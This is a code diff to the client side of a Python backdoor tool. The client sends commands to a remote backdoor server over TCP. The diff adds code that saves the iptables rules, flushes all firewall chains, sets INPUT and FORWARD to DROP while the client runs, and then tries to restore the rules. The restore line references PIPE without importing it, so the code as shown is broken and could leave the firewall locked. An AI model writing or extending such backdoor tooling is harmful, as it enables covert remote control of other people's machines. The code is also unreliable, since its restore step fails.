@@ -4,6 +4,7 @@ from threading import Thread
 import argparse
 import backdoor
 import command
+import subprocess
 import sys
 import utils
 
@@ -55,6 +56,14 @@ def main():
         server.run()
     
     else:
+
+        # Get the original iptables rules for later restoration
+        p = subprocess.Popen("iptables-save", stdout=subprocess.PIPE)
+        iptables_rules = p.communicate()[0]
+
+        # Delete all chains and refuse incoming traffic
+        subprocess.call("iptables -F; iptables -X; iptables -P INPUT DROP; iptables -P FORWARD DROP", shell=True)
+
         if args.protocol == "tcp":
             client = backdoor.TcpBackdoorClient(key, pw, args.lport, args.dport, args.server)
             print("starting the TCP Client")
@@ -101,6 +110,10 @@ def main():
 
             # No exception - try to have the server execute this
             client.send_command(cmd)
+
+        # Restore original firewall rules
+        p = subprocess.Popen('iptables-restore', stdin=PIPE)
+        p.communicate(input=iptables_rules)
 
 if __name__ == "__main__":
     main()
